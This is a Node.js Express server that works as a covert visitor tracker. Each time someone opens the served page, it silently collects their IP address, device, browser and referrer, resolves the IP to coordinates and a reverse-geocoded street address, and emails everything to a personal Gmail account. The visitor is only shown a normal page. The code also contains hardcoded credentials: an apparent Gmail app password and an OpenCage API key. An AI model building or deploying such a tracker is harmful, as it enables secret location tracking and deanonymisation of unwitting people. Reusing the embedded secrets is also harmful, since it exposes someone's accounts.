const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const app = express();

app.set('trust proxy', true);

// Configure transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'staysane.rz@gmail.com',
    pass: process.env.EMAIL_PASS || 'nvkq cudo ibhh usdr'
  }
});

app.get('/', async (req, res) => {
  const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const referrer = req.headers['referer'] || 'direct';
  const timestamp = new Date().toISOString();

  // Device parsing
  const parser = new UAParser(userAgent);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();

  const deviceBrand = device.vendor || 'Unknown brand';
  const deviceModel = device.model || 'Unknown model';
  const osInfo = `${os.name || 'OS'} ${os.version || ''}`.trim();
  const browserInfo = `${browser.name || 'Browser'} ${browser.version || ''}`.trim();

  let location = 'Unknown';
  let coordinates = 'N/A';
  let timezone = 'N/A';
  let geoAddress = 'N/A';

  try {
    // Get IP-based geo info
    const geo = await axios.get(`http://ip-api.com/json/${ip}`);
    const { city, regionName, country, isp, lat, lon, timezone: tz } = geo.data;

    location = `${city}, ${regionName}, ${country} (ISP: ${isp})`;
    coordinates = `Latitude: ${lat}, Longitude: ${lon}`;
    timezone = tz || 'N/A';

    // Reverse geocoding using OpenCage API
    const OPEN_CAGE_KEY = 'cd07cd206f6a4f7086bed7fa65741f82';
    const reverseGeo = await axios.get(`https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${OPEN_CAGE_KEY}`);
    const components = reverseGeo.data.results[0]?.formatted;
    geoAddress = components || 'N/A';
  } catch (err) {
    console.error('Geo lookup failed:', err.message);
  }

  const mailOptions = {
    from: 'zyron',
    to: 'xraymundzyron@gmail.com',
    subject: 'Visitor accessed your URL',
    text: `New visit detected!

Timestamp: ${timestamp}
IP Address: ${ip}
Location: ${location}
Reverse Geocoded Address: ${geoAddress}
Coordinates: ${coordinates}
Timezone: ${timezone}

Device Brand: ${deviceBrand}
Device Model: ${deviceModel}
OS: ${osInfo}
Browser: ${browserInfo}

User Agent: ${userAgent}
Referrer: ${referrer}`
  };

  transporter.sendMail(mailOptions, (error) => {
    if (error) console.error('Email failed:', error);
  });

  res.sendFile(__dirname + '/index.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Tracker running on port ${PORT}`));
